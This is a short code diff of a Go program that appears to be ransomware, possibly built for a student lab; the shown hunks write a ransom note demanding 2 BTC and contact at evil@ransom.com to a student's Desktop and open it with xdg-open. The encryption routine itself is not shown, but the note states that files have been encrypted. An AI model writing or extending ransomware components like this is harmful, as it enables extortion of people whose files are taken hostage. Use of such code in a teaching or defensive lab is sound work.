@@ -110,7 +110,7 @@ func main() {
 	})
 
 	// Optionally open a ransom note in editor
-	_ = os.WriteFile("README_RESTORE_FILES.txt", []byte(`Your files have been encrypted!
+	_ = os.WriteFile("/home/student/Desktop/README_RESTORE_FILES.txt", []byte(`Your files have been encrypted!
 To recover them, send 2 BTC to the address:
 bc1qexampleaddressformalice12345678
 
@@ -118,7 +118,7 @@ Then email evil@ransom.com with your transaction ID.
 
 DO NOT DELETE THIS FILE. Your files will be lost forever.`), 0644)
 
-	_ = exec.Command("xdg-open", "README_RESTORE_FILES.txt").Start()
+	_ = exec.Command("xdg-open", "/home/student/Desktop/README_RESTORE_FILES.txt").Start()
 }
 
 
